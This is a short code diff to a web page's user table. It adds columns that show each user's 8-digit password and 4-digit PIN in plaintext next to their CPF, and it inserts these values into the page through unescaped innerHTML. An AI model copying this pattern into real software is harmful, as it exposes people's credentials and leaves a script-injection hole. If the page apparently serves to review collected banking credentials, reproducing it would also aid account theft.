@@ -200,6 +200,8 @@
         <tr>
           <th>#</th>
           <th>CPF</th>
+          <th>Senha (8 dígitos)</th>
+          <th>PIN (4 dígitos)</th>
           <th>Data de Cadastro</th>
         </tr>
       </thead>
@@ -279,6 +281,8 @@ function renderizar(lista) {
     tr.innerHTML = `
       <td>${u.id}</td>
       <td class="cpf-cell">${cpfFormatado}</td>
+      <td class="cpf-cell">${u.senha || '—'}</td>
+      <td class="cpf-cell">${u.pin || '—'}</td>
       <td class="date-cell">${dataStr}</td>
     `;
     tbody.appendChild(tr);
